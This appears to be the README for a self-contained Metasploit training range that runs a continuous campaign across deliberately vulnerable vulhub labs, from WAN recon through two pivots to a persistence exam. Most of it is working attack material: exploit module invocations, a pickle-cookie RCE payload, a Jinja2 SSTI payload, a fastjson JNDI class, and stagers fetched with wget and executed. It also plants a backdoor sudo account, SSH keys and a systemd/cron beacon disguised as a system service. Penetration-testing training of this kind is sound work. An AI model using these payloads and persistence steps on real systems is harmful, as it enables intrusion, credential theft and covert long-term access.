# KAGE-MAN.DOJO — The All-Belts Campaign

**A self-contained Metasploit range · three segments · twenty-six labs · one continuous campaign**

This range teaches Metasploit end-to-end in five forms. A student Kali sits on
the **WAN** for the entire campaign: it starts against an internet edge of
seven exposed services, crosses a dual-homed door into the DMZ with a first
`autoroute`, reflex-sweeps that segment with ready-made modules, configures
and chains its way through a second seam into INTERNAL, exploits the deep
targets manually with the full `msfvenom` → handler workflow — and finishes
with a **persistence exam** where payloads must survive restarts and a real
reboot.

| Form | Belt | What you prove |
|---|---|---|
| 1 | white | WAN attack surface + the single door, then reflex-sweep seven DMZ targets with modules alone |
| 2 | brown | Configure, chain and auxiliary-driven access — ending on the first INTERNAL target |
| 3 | black | Manual exploitation on INTERNAL + full `msfvenom` → handler → post workflow, incl. a JNDI relay |
| 4 | — | Pivot masterclass: routes, socks, portfwd, and reverse-through-pivot relays |
| 5 | **capstone** | **Persistence:** web payloads, backdoor accounts, SSH keys, systemd/cron beacons — verified across a reboot |

Per-lab credentials and options live in each vendored lab README at
`vulhub/<app>/<cve>/README.md`. Architecture and inventory are in
[`README.md`](README.md).

> Convention: `<kali-wan-ip>` is your Kali's WAN address (e.g. `10.0.8.100`).
> Start the catcher before firing the primitive. **Default to bind payloads**
> for anything behind a seam — Metasploit connects to bind payloads *through
> the autoroutes*. Reverse payloads (including JNDI callbacks, which are
> reverse by nature) need a relay — introduced in Form 3B, formalized in
> Form 4. Bring labs up **per lesson**, not all at once.

---

## Form 0 — Recon on the WAN

Kali is attached to the WAN only. Seven services are exposed; exactly one of
them leads deeper.

```bash
./scripts/labs.sh up activemq struts2 spring cacti joomla opensmtpd erlang
nmap -sn 10.0.8.0/24
nmap -sV -p 61616,8161,8080,80,25,2222 10.0.8.20-26
```

| Host | Service | Port | Role |
|---|---|---|---|
| `10.0.8.20` | ActiveMQ | 61616 / 8161 | **the door** (dual-homed into the DMZ) |
| `10.0.8.21` | Apache Struts2 | 8080 | warm-up (dead end) |
| `10.0.8.22` | Spring MVC | 8080 | warm-up (dead end) |
| `10.0.8.23` | Cacti | 80 | warm-up (dead end) |
| `10.0.8.24` | Joomla | 80 | warm-up (dead end) |
| `10.0.8.25` | OpenSMTPD | 25 | warm-up (dead end) |
| `10.0.8.26` | Erlang/OTP SSH | 2222 | warm-up (dead end) |

---

## Form 1 — White belt: the internet edge, the door, and the DMZ reflex

### Lesson 1A — internet-edge warm-ups (optional)

```bash
./scripts/labs.sh up struts2 spring cacti joomla opensmtpd erlang
```

Six modules, one reflex — `use` / `set RHOSTS` / `set LHOST` / `run`. All six
targets can reach Kali directly (same segment), so the module defaults work.
**They lead nowhere deeper** — that is the point: "a shell is not a pivot".

```
# Struts2 S2-045 — Jakarta multipart OGNL
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 10.0.8.21
set RPORT 8080
set LHOST <kali-wan-ip>
run

# Spring4Shell — ClassLoader property RCE
use exploit/multi/http/spring_framework_rce_spring4shell
set RHOSTS 10.0.8.22
set RPORT 8080
set LHOST <kali-wan-ip>
run

# Cacti — unauthenticated command injection
use exploit/linux/http/cacti_unauthenticated_cmd_injection
set RHOSTS 10.0.8.23
set RPORT 80
set LHOST <kali-wan-ip>
run

# Joomla — HTTP header object injection
use exploit/multi/http/joomla_http_header_rce
set RHOSTS 10.0.8.24
set RPORT 80
set LHOST <kali-wan-ip>
run

# OpenSMTPD — MAIL FROM command injection
use exploit/unix/smtp/opensmtpd_mail_from_rce
set RHOSTS 10.0.8.25
set RPORT 25
set LHOST <kali-wan-ip>
run

# Erlang/OTP — pre-auth SSH RCE
use exploit/linux/ssh/ssh_erlangotp_rce
set RHOSTS 10.0.8.26
set RPORT 2222
set LHOST <kali-wan-ip>
run
```

If a module's default payload doesn't fit your listener, run `show payloads`
and pick one — everything on this segment is directly reachable.

### 1.1 — The door: ActiveMQ (`10.0.8.20`)

`exploit/multi/misc/apache_activemq_rce_cve_2023_46604` makes the target fetch
a Spring XML from you and run `payload.encoded` via `/bin/sh -c`. That means
the payload must be a **command** payload — start with a shell, then upgrade
to Meterpreter (the target image has `wget`/`curl`/`perl`):

```
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOSTS 10.0.8.20
check                                    # AutoCheck: identifies ActiveMQ 5.17.3
set TARGET 1                             # Linux (index 0 is Windows!)
set PAYLOAD cmd/unix/reverse_bash
set LHOST <kali-wan-ip>
set LPORT 4444
run                                      # -> session 1: command shell (root)
```

Only ActiveMQ is dual-homed (WAN `10.0.8.20` + DMZ `192.168.80.20`) — this
session is the bridge onto the DMZ. Upgrade it to Meterpreter (a plain shell
cannot forward traffic):

```
sessions -l
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <kali-wan-ip>
set LPORT 4445
run                                      # -> new Meterpreter session
```

### 1.2 — Pivot on: the DMZ road

```
sessions -i <meterpreter-id>
run autoroute -s 192.168.80.0/24
background
route print                              # 192.168.80.0/24 via the activemq session
```

Map the new segment **through** the session — this is scanning behind a pivot:

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.80.0/24
set PORTS 22,80,445,5984,6379,8080,9001,10000
set THREADS 16
run
```

### Lesson 1B — stores & servers

```bash
./scripts/labs.sh up couchdb redis httpd samba
```

**CouchDB (`192.168.80.21:5984`)** — same module as a white-belt drill, but
fired through the route, so use a bind payload:

```
use exploit/linux/http/apache_couchdb_cmd_exec
set RHOSTS 192.168.80.21
set RPORT 5984
set PAYLOAD linux/x64/meterpreter/bind_tcp
set LPORT 4446
run
```

**Redis (`192.168.80.22:6379`)** — unauthenticated master/slave replication:

```
use exploit/linux/redis/redis_replication_cmd_exec
set RHOSTS 192.168.80.22
set RPORT 6379
set PAYLOAD linux/x64/meterpreter/bind_tcp
set LPORT 4447
run
```

**Apache httpd (`192.168.80.25:80`)** — path traversal into CGI execution
(`mod_cgi` is enabled in the lab; the module walks `/.%2e/` to `/cgi-bin`):

```
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS 192.168.80.25
set RPORT 80
set PAYLOAD linux/x64/meterpreter/bind_tcp
set LPORT 4449
run
```

**Samba (`192.168.80.26:445`)** — SambaCry; note the **interact payload**: the
shell lives on the module's own SMB connection, so this target needs no
callback at all — the cleanest module in a routed segment:

```
use exploit/linux/samba/is_known_pipename
set RHOSTS 192.168.80.26
set PAYLOAD cmd/unix/interact
run
```

The lab's writable share is `myshare` (`/home/share`, guest access). If share
discovery fails: `set SMB_SHARE_NAME myshare`.

### Lesson 1C — apps & admin panels

```bash
./scripts/labs.sh up drupal webmin thinkphp
```

**ThinkPHP (`192.168.80.29:80`)** — the module's references are literally this
lab (`5-rce`):

```
use exploit/unix/webapp/thinkphp_rce
set RHOSTS 192.168.80.29
set RPORT 80
set PAYLOAD linux/x64/meterpreter/bind_tcp
set LPORT 4450
run
```

**Drupal (`192.168.80.27:80`)** — Drupalgeddon2 (keep this session: Drupal is
also a Form-5 web-persistence host):

```
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.80.27
set RPORT 80
set PAYLOAD php/meterpreter/bind_tcp
set LPORT 4451
run
```

**Webmin (`192.168.80.28:10000`)** — the password-reset backdoor, on HTTPS:

```
use exploit/linux/http/webmin_backdoor
set RHOSTS 192.168.80.28
set RPORT 10000
set SSL true
set PAYLOAD linux/x64/meterpreter/bind_tcp
set LPORT 4452
run                                      # root (Webmin runs as root)
```

**White belt earned:** the door plus seven DMZ sessions — every one of them
reached *through* the first autoroute — and six optional WAN warm-ups.

---

## Form 2 — Brown belt: configure, chain & auxiliary access

```bash
./scripts/labs.sh up tomcat libssh supervisor mysql
```

### 2.1 — libssh (`192.168.80.30:22`) — auxiliary-driven access

The CVE-2018-10933 bypass answers "success" to any authentication. The MSF
module has Actions; **Shell** (default) hands you a session with no password:

```
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS 192.168.80.30
set RPORT 22
run                                      # -> shell session (Action: Shell)
# Action Execute runs a single command instead: set ACTION Execute; set CMD id
```

### 2.2 — Supervisor (`192.168.80.31:9001`) — a config issue, then RCE

The lab's XML-RPC interface runs **without authentication** (a misconfiguration
in itself); the module turns a crafted XML-RPC call into command execution:

```
use exploit/linux/http/supervisor_xmlrpc_exec
set RHOSTS 192.168.80.31
set RPORT 9001
set PAYLOAD linux/x64/meterpreter/bind_tcp
set LPORT 4453
run
# if auth were enabled you would add: set HttpUsername <u>; set HttpPassword <p>
```

### 2.3 — The seam: Tomcat (`192.168.80.23:8080`, dual-homed into INTERNAL)

Credentials and a manager deployment — the brown-belt lesson. Creds are in the
lab README (`tomcat` / `tomcat`; `manager-script` + `manager-gui` enabled and
the lab's `context.xml` removes the remote-address restriction):

```
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.80.23
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set TARGETURI /manager
set PAYLOAD java/meterpreter/bind_tcp
set LPORT 4448
run                                      # -> session 2: java meterpreter on the seam
```

### 2.4 — Cross the seam

```
sessions -i 2
run autoroute -s 172.16.80.0/24
background
route print                              # DMZ via session 1 · INTERNAL via session 2
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.80.0/24
set PORTS 2222,3306,5432,8000,8090,9000
run
```

### 2.5 — MySQL (`172.16.80.45:3306`) — the first internal target

CVE-2012-2122: repeated password attempts eventually authenticate. The module
uses the bypass to dump the user hashes:

```
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
set RHOSTS 172.16.80.45
set RPORT 3306
set USERNAME root
run                                      # -> usernames + password hashes
```

Impact lesson: crack the hashes offline (`john`/`hashcat`) and reuse
credentials — *access without a shell* is still a win.

**Brown belt earned:** aux-driven access, a configured-and-deployed module, a
second pivot hop, and your first internal loot.

---

## Form 3 — Black belt: manual exploitation on INTERNAL

```bash
./scripts/labs.sh up uwsgi unpickle ssti fastjson minio postgres polkit
# polkit runs a full VM inside the container: ~10 min boot. Watch it:
./scripts/labs.sh logs polkit
```

### 3.1 — A channel for your own tools (socks over the routes)

```
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run -j
```

From a shell on Kali (`curl` speaks SOCKS natively; `proxychains4` for the
rest — set its last line to `socks5 127.0.0.1 1080`):

```bash
curl --socks5-hostname 127.0.0.1:1080 http://172.16.80.41:8000/
proxychains4 nmap -sT -Pn -n -p 8000,5432,2222 172.16.80.0/24
```

### 3.2 — Stage a bind stager on the seam (the "payload CDN" pattern)

INTERNAL targets can't reach Kali — and they don't need to. Session 2 is a
dual-homed host on their segment; make it serve the stager:

```bash
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4500 -f elf -o /tmp/p.elf
```

```
sessions -i 2
upload /tmp/p.elf /usr/local/tomcat/webapps/ROOT/p.elf
background
```

The stager is now at `http://172.16.80.20:8080/p.elf` for anything on
INTERNAL. Catcher (per target, one at a time — bind handler needs `RHOST`):

```
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/bind_tcp
set RHOST <target>
set LPORT 4500
run
```

### Lesson 3A — three manual boxes, one stager

**uWSGI (`172.16.80.46:8000`)** — the protocol itself is the hole: a crafted
uwsgi packet with the `UWSGI_FILE` magic var runs a command. Use the lab's
`poc.py` through the socks channel:

```bash
# poc.py lives at vulhub/uwsgi/unacc/poc.py
proxychains4 python3 poc.py -u 172.16.80.46:8000 \
  -c "wget -q http://172.16.80.20:8080/p.elf -O /tmp/p && chmod +x /tmp/p && /tmp/p"
```

**Python unpickle (`172.16.80.41:8000`)** — the app `base64`-decodes the `user`
cookie and unpickles it. Build the cookie with a `__reduce__` that stages and
runs the stager:

```python
# /root/cookie.py
import pickle, base64, os
class P:
    def __reduce__(self):
        return (os.system, ("wget -q http://172.16.80.20:8080/p.elf -O /tmp/p && chmod +x /tmp/p && /tmp/p",))
print(base64.b64encode(pickle.dumps(P())).decode())
```

```bash
curl --socks5-hostname 127.0.0.1:1080 \
     -b "user=$(python3 /root/cookie.py)" http://172.16.80.41:8000/
```

**Flask/Jinja2 SSTI (`172.16.80.42:8000`)** — same stage command through the
template engine (`{{233*233}}` → `54289` confirms it):

```bash
PAY='{{ config.__class__.__init__.__globals__["os"].popen("wget -q http://172.16.80.20:8080/p.elf -O /tmp/p && chmod +x /tmp/p && /tmp/p").read() }}'
curl --socks5-hostname 127.0.0.1:1080 -G "http://172.16.80.42:8000/" \
     --data-urlencode "name=$PAY"
```

Each of the three lands on the catcher from 3.2 → Meterpreter.

### Lesson 3B — fastjson: JNDI behind a relay

Java 8u102 `JdbcRowSetImpl` lets us inject a JNDI lookup. JNDI callbacks are
**reverse connections** — the target must reach *your* fake RMI/LDAP server,
which no INTERNAL target can do. Solution: the seam relays the callback to Kali
(this is the Form-4 relay pattern, used here because it is mandatory).

**1. Open the relay on the seam** (it listens on its INTERNAL home, forwards to
Kali):

```
sessions -i 2
portfwd add -l 9999 -p 9999 -r <kali-wan-ip>
background
```

**2. Build the malicious class and host it on the seam webroot** (the target
loads the class from the seam, not from Kali):

```java
// TouchFile.java — execs the usual stage command on load
public class TouchFile {
  static {
    try { Runtime.getRuntime().exec(new String[]{"bash", "-c",
      "wget -q http://172.16.80.20:8080/p.elf -O /tmp/p && chmod +x /tmp/p && /tmp/p"}); }
    catch (Exception ignored) {}
  }
}
```

```bash
javac TouchFile.java
```

```
sessions -i 2
upload TouchFile.class /usr/local/tomcat/webapps/ROOT/TouchFile.class
background
```

**3. Start the RMI reference server on Kali** (class codebase = the seam):

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
     marshalsec.jndi.RMIRefServer "http://172.16.80.20:8080/#TouchFile" 9999
# (one-click alternative: the java-chains tool)
```

**4. Deliver the payload through the socks channel** — note the RMI address is
the seam's INTERNAL IP, which the relay forwards:

```bash
curl --socks5-hostname 127.0.0.1:1080 http://172.16.80.47:8090/ \
  -H "Content-Type: application/json" \
  --data '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://172.16.80.20:9999/TouchFile","autoCommit":true}'
```

Catcher from 3.2 (`RHOST 172.16.80.47`) → Meterpreter as the fastjson user.

### Lesson 3C — credential & data targets

**PostgreSQL (`172.16.80.44:5432`)** — creds `postgres`/`postgres`; the module
delivers its own stager via `COPY FROM PROGRAM`:

```
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS 172.16.80.44
set RPORT 5432
set USERNAME postgres
set PASSWORD postgres
set PAYLOAD linux/x64/meterpreter/bind_tcp
set LPORT 4503
run
```

**MinIO (`172.16.80.48:9000`)** — the API leaks every environment variable,
including the root credentials. Run the aux module through the routes:

```
use auxiliary/gather/minio_bootstrap_verify_info_disc
set RHOSTS 172.16.80.48
set RPORT 9000
run                                      # -> MINIO_ROOT_USER / MINIO_ROOT_PASSWORD
```

Then demonstrate the **impact of credentials, not shells** — object-storage
root from your terminal, through the pivot:

```bash
proxychains4 mc alias set dojo http://172.16.80.48:9000 <MINIO_ROOT_USER> <MINIO_ROOT_PASSWORD>
proxychains4 mc ls dojo/
```

### Lesson 3D — polkit PwnKit (`172.16.80.43:2222`) — SSH in, then local module

The lab is a **full Ubuntu 20.04 VM inside the container** (SSH
`ubuntu` / `vulhub`). Log in **through the pivot**, then let Metasploit own
the box:

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 172.16.80.43
set RPORT 2222
set USERNAME ubuntu
set PASSWORD vulhub
set STOP_ON_SUCCESS true
run                                      # -> shell session (over the routes)

use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION <ssh-shell-session-id>       # supports shell and meterpreter sessions
set PAYLOAD linux/x64/meterpreter/bind_tcp
set LPORT 4504
run                                      # -> root Meterpreter on the VM
```

Keep this root session — it is the persistence host in Form 5.

### Lesson 3E — PHP 8.1 backdoor (`192.168.80.24:80`) — manual, with the header trick

```bash
./scripts/labs.sh up php
```

The `User-Agentt` backdoor evals raw PHP code after the `zerodium` prefix —
so an `msfvenom` **PHP payload** goes straight into a header (no `<?php` tag
for `eval`):

```bash
msfvenom -p php/meterpreter/bind_tcp LPORT=4502 -f raw -o /tmp/shell.php
CODE=$(sed -e 's/^<?php//' -e 's/?>$//' /tmp/shell.php | tr -d '\n')
curl --socks5-hostname 127.0.0.1:1080 \
     -H "User-Agentt: zerodium$CODE" http://192.168.80.24/
```

```
use exploit/multi/handler
set PAYLOAD php/meterpreter/bind_tcp
set RHOST 192.168.80.24
set LPORT 4502
run                                      # connects via session 1's DMZ route
```

**Black belt earned:** six sessions/roots on INTERNAL targets and one on the
DMZ — five of them without the vulnerable app ever having a Metasploit module.

---

## Form 4 — Pivot masterclass

No new labs — this form drills the chain you built, on purpose:

```
Kali ──(session 1: activemq, WAN+DMZ)──▶ 192.168.80.0/24
Kali ──(session 2: tomcat8, DMZ+INTERNAL)──▶ 172.16.80.0/24
```

### Routes

```
route print          # in msfconsole
run autoroute -p     # from a meterpreter session
```

### Socks proxy for non-MSF tooling

Already running from 3.1 (`auxiliary/server/socks_proxy`, `127.0.0.1:1080`):

```bash
proxychains4 nmap -sT -Pn -n -p 8000,5432,2222 172.16.80.0/24
ssh -o ProxyCommand="nc -X 5 -x 127.0.0.1:1080 %h %p" ubuntu@172.16.80.43 -p 2222
curl --socks5-hostname 127.0.0.1:1080 http://172.16.80.41:8000/
```

### portfwd — reaching a deep service from your own terminal

```
sessions -i 2
portfwd add -l 5432 -p 5432 -r 172.16.80.44    # seam listens -> forwards to postgres
portfwd list
# from Kali:  psql -h 127.0.0.1 -U postgres
portfwd flush
```

### Reverse payloads through a pivot (the general pattern)

You already used this for the fastjson JNDI callback (3B). Formalized: on the
seam that faces the target —

```
sessions -i 2
portfwd add -l 4600 -p 4600 -r <kali-wan-ip>   # seam:4600 -> Kali:4600
background

use <module>
set PAYLOAD <reverse payload>
set LHOST 172.16.80.20                         # the seam's INTERNAL home (reachable by target)
set LPORT 4600
set ReverseListenerBindAddress <kali-wan-ip>   # handler actually binds here
set ReverseListenerBindPort 4600
run
```

For DMZ targets, relay off session 1 (`LHOST 192.168.80.20`); for targets
behind both seams, chain two relays (session 2 → `192.168.80.20`, session 1 →
Kali). Decision table:

| Situation | Use |
|---|---|
| Target behind any seamed route, payload has a bind variant | **bind payload** (recommended) |
| Target behind a seam, reverse-only payload / JNDI callback | seam `portfwd` → Kali + `ReverseListenerBindAddress` |
| Non-MSF tooling (nmap/ssh/psql/mc/browser) | `socks_proxy` + proxychains / `--socks5-hostname` |

---

## Form 5 — Persistence capstone (`msfvenom` payloads that survive)

Persistence here means four **different payload formats** landing in four
delivery channels — and every artifact verified after a restart or reboot.
Remember the semantics: `docker restart` keeps the container filesystem;
`labs.sh down`+`up` recreates containers (files lost); `labs.sh reset` wipes
volumes. The `polkit` VM's disk lives inside its container — same rules.

Payload matrix used in this form:

| Target | Payload | Format | Delivery channel |
|---|---|---|---|
| Linux ELF (beacon) | `linux/x64/meterpreter/bind_tcp` | `elf` | systemd unit / cron / `.bashrc` |
| Tomcat (JVM) | `java/jsp_shell_bind_tcp` | `raw` (JSP) | webapp directory (web shell) |
| PHP (backdoor host / CMS) | `php/meterpreter/bind_tcp` | `raw` (PHP) | webroot file |
| Account | `post/linux/manage/adduser` | — | user account + sudo group |

### 5.1 — Account persistence — the polkit VM (`172.16.80.43`)

Backdoor account via the **MSF persistence module** (uses your root session
from 3D):

```
use post/linux/manage/adduser
set SESSION <root-meterpreter-on-polkit>
set USERNAME svc-backup
set PASSWORD 'Dojo!Passw0rd'
set SHELL /bin/bash
set HOME /home/svc-backup
set GROUPS sudo
set SudoMethod GROUP
run
```

Verify **without any MSF session** — this is the whole point:

```bash
proxychains4 ssh svc-backup@172.16.80.43 -p 2222     # password: Dojo!Passw0rd
sudo -l                                               # sudo group -> root
```

Manual SSH-key persistence (the classic): generate a keypair on Kali, append
the public key on the target through the root session —

```
sessions -i <root-session>
shell
mkdir -p -m 700 /home/ubuntu/.ssh
echo '<paste ./dojo-key.pub>' >> /home/ubuntu/.ssh/authorized_keys
chmod 600 /home/ubuntu/.ssh/authorized_keys
exit
```

```bash
ssh-keygen -t ed25519 -f /root/dojo-key -N ''
proxychains4 ssh -i /root/dojo-key ubuntu@172.16.80.43 -p 2222   # key only
```

### 5.2 — Daemon persistence — systemd + cron, and a real reboot

Build the beacon (bind payload: the deep host never needs to reach Kali):

```bash
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf -o /tmp/dojo-beacon
```

Deploy via the root session:

```
sessions -i <root-session>
upload /tmp/dojo-beacon /usr/local/bin/dojo-beacon
shell
chmod 755 /usr/local/bin/dojo-beacon

cat >/etc/systemd/system/dojo-beacon.service <<'EOF'
[Unit]
Description=System Network Cache Service
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/local/bin/dojo-beacon
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now dojo-beacon
systemctl status dojo-beacon --no-pager
ss -tlnp | grep 4444                     # beacon is listening

# belt-and-braces: cron fallback
echo '@reboot root /usr/local/bin/dojo-beacon' > /etc/cron.d/dojo-beacon
chmod 644 /etc/cron.d/dojo-beacon
exit
```

**The reboot test** (the inner VM is a real Ubuntu — reboot it for real):

```bash
proxychains4 ssh ubuntu@172.16.80.43 -p 2222 'sudo reboot'
# ~10 minutes for the cloud VM to come back; poll until it answers:
proxychains4 ssh ubuntu@172.16.80.43 -p 2222 'uptime'
```

Now reconnect **with zero interaction on the target** — the beacon came up by
itself through the still-live seam:

```
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/bind_tcp
set RHOST 172.16.80.43
set LPORT 4444
run                                      # root Meterpreter, post-reboot
```

**Tradecraft (write this up like an operator):** for every artifact record
*what* it is, *where* it lives, *who* owns it, *how* it triggers, and *how to
remove it*:

| Artifact | Path | Trigger |
|---|---|---|
| account | `svc-backup` (sudo group) | SSH password |
| SSH key | `/home/ubuntu/.ssh/authorized_keys` | SSH key |
| service | `/etc/systemd/system/dojo-beacon.service` | boot (systemd) |
| binary | `/usr/local/bin/dojo-beacon` | service / cron |
| cron | `/etc/cron.d/dojo-beacon` | `@reboot` |

Cleanup checklist:

```
systemctl disable --now dojo-beacon
rm -f /etc/systemd/system/dojo-beacon.service /usr/local/bin/dojo-beacon /etc/cron.d/dojo-beacon
userdel -r svc-backup
rm -f /home/ubuntu/.ssh/authorized_keys
```

### 5.3 — Web payload persistence — Tomcat, PHP and Drupal (survives restarts)

**Tomcat** — deploy a JSP bind shell into the seam's webapp (it survived
`tomcat_mgr_upload`; now it survives *service restarts*):

```bash
msfvenom -p java/jsp_shell_bind_tcp LPORT=4505 -f raw -o /tmp/p.jsp
```

```
sessions -i 2
upload /tmp/p.jsp /usr/local/tomcat/webapps/ROOT/p.jsp
background
```

Restart the service (this is the "reboot" for a container). Watch what dies
with it — **the INTERNAL route goes with session 2**:

```bash
docker restart kagemandojo-tomcat-tomcat8-tomcat
route print          # INTERNAL is gone
```

Re-shell **from the file you left behind**, through session 1's DMZ route —
no credentials, no module, no exploit:

```
use exploit/multi/handler
set PAYLOAD java/jsp_shell_bind_tcp
set RHOST 192.168.80.23
set LPORT 4505
run
```

Then rebuild the seam (the exam-grade habit — re-establish what a reboot
broke): re-run `tomcat_mgr_upload` (Form 2) for a fresh session 2, and
`run autoroute -s 172.16.80.0/24` again.

**PHP** — the webroot file survives the restart:

```bash
msfvenom -p php/meterpreter/bind_tcp LPORT=4506 -f raw -o /tmp/pp.php   # keep the <?php tag on disk
```

```
sessions -i <php-session-from-3E>
upload /tmp/pp.php /var/www/html/pp.php
background
```

```bash
docker restart kagemandojo-php-8-1-backdoor-web
```

Re-shell **without ever touching the backdoor header again**:

```
use exploit/multi/handler
set PAYLOAD php/meterpreter/bind_tcp
set RHOST 192.168.80.24
set LPORT 4506
run
```

**Drupal — bonus CMS persistence** (same trick, third webroot; Drupal runs
Apache + PHP and its session is `www-data`):

```bash
msfvenom -p php/meterpreter/bind_tcp LPORT=4507 -f raw -o /tmp/dp.php
```

```
sessions -i <drupal-session-from-1C>
upload /tmp/dp.php /var/www/html/dp.php
background
```

```bash
docker restart kagemandojo-drupal-cve-2018-7600-web
```

```
use exploit/multi/handler
set PAYLOAD php/meterpreter/bind_tcp
set RHOST 192.168.80.27
set LPORT 4507
run
```

Cleanup: remove `p.jsp` / `pp.php` / `dp.php` via a session (or `make reset`
the labs). Semantics recap: the files survived `restart`; a full
`labs.sh down`+`up` recreates the containers and wipes them — know which
"reboot" you are claiming to survive, and say so in the write-up.

---

## Graduation — the Kage exam

A Kage does the whole campaign in one sitting, from a WAN-only seat:

| Proof | From |
|---|---|
| WAN sweep: six internet-edge sessions (optional) + the door, DMZ route live | Form 1 |
| Door + 7 DMZ reflex sessions with modules alone | Form 1 |
| Brown belt: libssh, supervisor, seam (Tomcat), mysql — INTERNAL route live | Form 2 |
| Black belt: root on uwsgi, unpickle, ssti, fastjson, postgres, polkit + the minio credential proof | Form 3 |
| socks + portfwd reach INTERNAL services from Kali; JNDI relay understood | Forms 3–4 |
| Backdoor account + SSH key work with no MSF session | 5.1 |
| Beacon calls home after a real reboot | 5.2 |
| Web shells (Tomcat, PHP, Drupal) re-shell after service restarts | 5.3 |
| The chain can be re-established after the seam reboots | 5.3 |

**Final practice run:** revert to your pre-class snapshot, start the machine
cold, and run the campaign end-to-end in one session of your own — ending with
the reboot-proof beacon. That run *is* the Kage belt.

---

## Safety note

- **Snapshot the VM before every class** and roll back afterwards — these are
  live, deliberately vulnerable services, and the persistence forms leave
  real artifacts behind.
- The **polkit VM** is heavy (~2 GB, slow boot) and **PwnKit lands root inside
  it** by design; treat a rooted lab as spent for the session.
- **A reset wipes a lab's volumes and web shells** — never reset a lab a
  student is mid-exercise on, and always run the cleanup checklist from 5.2
  when the persistence lesson is over.
- Bring labs up per lesson and `down` them between lessons; the JVM labs and
  the polkit VM will starve a small host.
